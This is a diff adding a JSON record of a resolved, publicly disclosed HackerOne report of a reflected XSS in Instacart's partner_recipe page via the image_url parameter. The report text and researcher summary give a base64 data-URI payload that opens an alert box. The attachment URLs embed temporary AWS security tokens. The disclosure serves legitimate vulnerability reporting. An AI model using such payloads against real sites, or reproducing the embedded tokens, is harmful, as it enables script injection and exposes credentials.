@@ -1,0 +1,158 @@
+{
+  "id": 227809,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjc4MDk=",
+  "url": "https://hackerone.com/reports/227809",
+  "title": "XSS at in instacart.com/store/partner_recipe",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2017-05-12T00:41:11.892Z",
+  "submitted_at": "2017-05-12T00:41:11.892Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ak1t4",
+    "url": "/ak1t4",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ygbscyk1hjiehik2alvfd4est1dj/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35527,
+    "url": "https://hackerone.com/instacart",
+    "handle": "instacart",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/o3gb7jh208og9ikm1jqbsj1461p5/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/o3gb7jh208og9ikm1jqbsj1461p5/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Instacart",
+      "twitter_handle": "instacart",
+      "website": "https://instacart.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-05-30T17:24:23.067Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-05-30T17:24:23.029Z",
+  "team_member_agreed_on_going_public_at": "2017-05-30T17:18:53.069Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nHi team, i found that this endpoint -> https://www.instacart.com/store/partner_recipe? at param ```image_url``` is vulnerable to XSS\n\n#### Reproduction Steps & PoC\n\n1)Go to ```https://www.instacart.com/store/partner_recipe?recipe_url=http://&partner_name=&ingredients[]=apples&ingredients[]=butter&ingredients[]=Splenda+Brown+Sugar+Blend&ingredients[]=cinnamon&ingredients[]=nutmeg&title=\"Barb%27s+Fried+Apples+-Diabetic-Low+Fat&description=&image_url=data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4 ```\n2) Right Click on link \"See Image\" or open image in new window\n3) You see the alert popup \n\n{F183896}\n{F183895}\n\n**Vulnerable Enpoint :** ```https://www.instacart.com/store/partner_recipe? ```\n**Vulnerable Param:** ``` image_url```\n**Vulnerable Payload:** ```data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4```\n\n**Tested on Browserss**: Latest **Firefox** & **Chrome**\n\nLet me know if more info needed or anything else,\n\nking regards,\n@ak1t4\n\n\n",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 183895,
+      "file_name": "Captura_de_pantalla_2017-05-11_a_las_21.32.38.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/183/895/7a8aeacd9ad061fad3dae0b6c3cc4eb322526b46/Captura_de_pantalla_2017-05-11_a_las_21.32.38.png?response-content-disposition=attachment%3B%20filename%3D%22Captura_de_pantalla_2017-05-11_a_las_21.32.38.png%22%3B%20filename%2A%3DUTF-8%27%27Captura_de_pantalla_2017-05-11_a_las_21.32.38.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYQUYVEFJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T221003Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBzKlhXwZKf2%2Fo%2BKlcXYLg6NhmHVb%2F4tHGSC%2BoS7ES9iAiEA8M9A8ASz9J1GE9hga6jx48unjpQ6N3PkQhlm7UNebtUqsgUIHRADGgwwMTM2MTkyNzQ4NDkiDAt0FWwTbQpj4AgE7yqPBTTIGlq%2F0YUtukQ5HHLvm8KtnQ%2B6mz9mBIANo73Mw99zjcob1kZR%2BxAascIlVnPzBwsGLj1dRIyouzQSDO8AXSoxxEzot1SPAFne%2B6B2waIt1gpF9wJPWGdIhImWu2k5G9Tg%2FdBkekVZ6GSxJHOnz8g8GQbv%2B3VNmYzLFtQOW88sGw%2BGKrc83%2Bv3j07PhTEIlMWhR6gQHIARIRDwC0GG%2Bb3cXy5%2BJelF1hGVTx4HMJ3KQfFk6ipFtvOqVHpmzvMTR2Anf9%2BVNQhUioF38WXsuLTh8XSLqAeNd51chgrolBEb0%2BtKQOURpSntqTHWL5GnrOsv%2Bf5O1n9gIl1pRDisMTf25jG8P9EX8lYhnlDYTRx8L8gglaN2VUFXWX0QVhPR5ENiAVaodC%2FFccfuvAXT1%2BaI70pIE4zd%2BNMQRVi8Y0dY%2F%2BYTIKjpZHMZNJM%2Fhfhi2VwgQMhjYGFNqKuBTBKIUu%2B6yLTGRq3fKhzkwhq2%2BhKebuiwGIcFMJKakAt89ct94Mrulvg2AZ7w7foqLQj4fSQcr9pLXpBVjwSqxxYhHYaxnpGAnSn108FRqTbAYSogB20P5LPVH9xFgE%2BWXhq8ScfPEFeER%2FN3ezXqPQTNL5Zg68hCwlJReVW386ys%2BGW3Qmd9lYtD99jDdorFN6Y3HwLFoosuom1OusjV4LVdlzVMt7xtMS%2BrN7YaVKZ6DtPPUwbjPYuf9v38pliJ3AnwBC0OhllviRRUvByALZHwp%2FeuLzEh0Dl%2BWplTXzZM6IiiGOgq7%2BAbs%2B4Ygs6IdjwQi4yd4yb%2FfqYT8fcRd5pHiRU8IIRxm4%2Fww08YWY7gFSKwotZ0uaZEOuAFmeaqsL9O0FXDndy73E%2FCs1R%2FwIEqP9Iw0afBxgY6sQFdDmqhpmU1p9pOLgozIBD02OgsMI9pV6JX3vcboowFeSIXEfWqM%2FW3%2BSVqOXxmCO5aKjsUEN06Feyoq6irsgHHj6xRAp6dutBo4EsQWflMY0T3Kz8PJ%2F9aRSDLSuuTTGjDzEg98ItYaqc7FcqWlmwWWFXYWGAI8GIJ7VyqUSXqANxBZULS3ld6wX5tZ07DHSOcHIZq8BkmsnrGYNBqMYilHXRm17Dm%2BybCYgOAeKxxwnA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9bbe1286b1eed3ed2ce8cde4ce9489907e92ceae6fdc03ab2158c761800a0142",
+      "file_size": 63021,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 183896,
+      "file_name": "Captura_de_pantalla_2017-05-11_a_las_21.32.33.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/183/896/2bad102bb2b912bb73244c9ebd1cade6c0994953/Captura_de_pantalla_2017-05-11_a_las_21.32.33.png?response-content-disposition=attachment%3B%20filename%3D%22Captura_de_pantalla_2017-05-11_a_las_21.32.33.png%22%3B%20filename%2A%3DUTF-8%27%27Captura_de_pantalla_2017-05-11_a_las_21.32.33.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYQUYVEFJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T221003Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBzKlhXwZKf2%2Fo%2BKlcXYLg6NhmHVb%2F4tHGSC%2BoS7ES9iAiEA8M9A8ASz9J1GE9hga6jx48unjpQ6N3PkQhlm7UNebtUqsgUIHRADGgwwMTM2MTkyNzQ4NDkiDAt0FWwTbQpj4AgE7yqPBTTIGlq%2F0YUtukQ5HHLvm8KtnQ%2B6mz9mBIANo73Mw99zjcob1kZR%2BxAascIlVnPzBwsGLj1dRIyouzQSDO8AXSoxxEzot1SPAFne%2B6B2waIt1gpF9wJPWGdIhImWu2k5G9Tg%2FdBkekVZ6GSxJHOnz8g8GQbv%2B3VNmYzLFtQOW88sGw%2BGKrc83%2Bv3j07PhTEIlMWhR6gQHIARIRDwC0GG%2Bb3cXy5%2BJelF1hGVTx4HMJ3KQfFk6ipFtvOqVHpmzvMTR2Anf9%2BVNQhUioF38WXsuLTh8XSLqAeNd51chgrolBEb0%2BtKQOURpSntqTHWL5GnrOsv%2Bf5O1n9gIl1pRDisMTf25jG8P9EX8lYhnlDYTRx8L8gglaN2VUFXWX0QVhPR5ENiAVaodC%2FFccfuvAXT1%2BaI70pIE4zd%2BNMQRVi8Y0dY%2F%2BYTIKjpZHMZNJM%2Fhfhi2VwgQMhjYGFNqKuBTBKIUu%2B6yLTGRq3fKhzkwhq2%2BhKebuiwGIcFMJKakAt89ct94Mrulvg2AZ7w7foqLQj4fSQcr9pLXpBVjwSqxxYhHYaxnpGAnSn108FRqTbAYSogB20P5LPVH9xFgE%2BWXhq8ScfPEFeER%2FN3ezXqPQTNL5Zg68hCwlJReVW386ys%2BGW3Qmd9lYtD99jDdorFN6Y3HwLFoosuom1OusjV4LVdlzVMt7xtMS%2BrN7YaVKZ6DtPPUwbjPYuf9v38pliJ3AnwBC0OhllviRRUvByALZHwp%2FeuLzEh0Dl%2BWplTXzZM6IiiGOgq7%2BAbs%2B4Ygs6IdjwQi4yd4yb%2FfqYT8fcRd5pHiRU8IIRxm4%2Fww08YWY7gFSKwotZ0uaZEOuAFmeaqsL9O0FXDndy73E%2FCs1R%2FwIEqP9Iw0afBxgY6sQFdDmqhpmU1p9pOLgozIBD02OgsMI9pV6JX3vcboowFeSIXEfWqM%2FW3%2BSVqOXxmCO5aKjsUEN06Feyoq6irsgHHj6xRAp6dutBo4EsQWflMY0T3Kz8PJ%2F9aRSDLSuuTTGjDzEg98ItYaqc7FcqWlmwWWFXYWGAI8GIJ7VyqUSXqANxBZULS3ld6wX5tZ07DHSOcHIZq8BkmsnrGYNBqMYilHXRm17Dm%2BybCYgOAeKxxwnA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=314a46e66400247f6074762f5b641f16fc55f831bb4e23cf85a6e0dd89356caf",
+      "file_size": 108495,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-06-29T17:18:53.128Z",
+  "allow_singular_disclosure_after": -259735870.36380625,
+  "singular_disclosure_allowed": true,
+  "vote_count": 18,
+  "voters": [
+    "th0roid",
+    "ali",
+    "nightm4re",
+    "h1-squirtle",
+    "r3y",
+    "eveeez",
+    "peeper35",
+    "ak1t4",
+    "0xspade",
+    "exception",
+    "and 8 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 4274,
+      "category": "researcher",
+      "content": "An XSS was injected at  instacart.com/store/partner_recipe & image_url param with this awesome payload -> data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4  :)\n\nThanks again to Karel Origin (https://twitter.com/Karel_Origin) for his report at https://hackerone.com/reports/196221, You made me think that more could be done,\nI owe you another beer :)\n",
+      "updated_at": "2017-05-30T17:24:10.870Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 93934,
+        "username": "ak1t4",
+        "name": "Ak1t4 ",
+        "bio": "Bug Bounty Hunter",
+        "cleared": true,
+        "verified": true,
+        "website": "https://twitter.com/akita_zen",
+        "location": "Argentina",
+        "created_at": "2016-07-21T10:28:35.804Z",
+        "url": "https://hackerone.com/ak1t4",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/ygbscyk1hjiehik2alvfd4est1dj/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ygbscyk1hjiehik2alvfd4est1dj/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MjY2MzQ1OCwicHVyIjoiYmxvYl9pZCJ9fQ==--aa2c85b1958c1baa3c6d61361ba119d3b97c10dd/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c155082ce6f9751dcb29cd6ea061a7e4d7329577/Captura%20de%20pantalla%202023-01-26%20a%20la(s)%2001.59.13.png"
+        }
+      }
+    }
+  ]
+}
